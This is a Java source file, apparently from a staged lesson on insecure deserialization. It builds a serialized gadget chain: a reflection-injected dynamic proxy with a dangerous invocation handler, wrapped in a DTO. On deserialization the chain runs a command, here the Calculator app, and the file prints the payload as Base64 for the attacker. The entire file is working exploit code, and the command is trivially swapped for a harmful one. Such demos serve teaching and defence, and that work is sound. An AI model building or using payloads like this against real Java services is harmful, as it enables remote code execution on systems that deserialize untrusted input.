package attacker.level2;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Map;

import victim.level2.DangerousSerializableInvocationHandler;
import victim.level2.SomeHarmlessMappingDTO;

public class AttackerPayloadCreator {

  public static void main(String[] args) throws Exception {
    System.out.println("Serializing a malicious payload:");
    ByteArrayOutputStream baos = new ByteArrayOutputStream();

    try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
      // use the dangerous serializable InvocationHandler from victim's ClassPath
      DangerousSerializableInvocationHandler handler = 
                                             new DangerousSerializableInvocationHandler();

      // create the proxy instance with it:
      Map mapViaProxy = (Map) Proxy.newProxyInstance(
                         Thread.currentThread().getContextClassLoader(), 
                         new Class[]{Map.class}, 
                         handler);
			
      // create the Gadget and set the desired payload data in it
      // (if private, use reflection)
      SomeHarmlessMappingDTO gadget = new SomeHarmlessMappingDTO();

      // ... set the "map" to our attacker-created proxy
      Field mapField = SomeHarmlessMappingDTO.class.getDeclaredField("nameMapping");
      mapField.setAccessible(true);
      mapField.set(gadget, mapViaProxy);
			
      // ... set the "name" (used as argument to get call of map) to desired command to execute
      Field nameField = SomeHarmlessMappingDTO.class.getDeclaredField("nameLastAdded");
      nameField.setAccessible(true);
      nameField.set(gadget, "/Applications/Calculator.app/Contents/MacOS/Calculator"); // or calc.exe on windows or whatever command on linux 
			
      // serialize the gadget
      oos.writeObject(gadget);
    }

    // Print for attacker to use
    String base64 = Base64.getEncoder().encodeToString(baos.toByteArray());
    System.out.println(base64);
  }

}
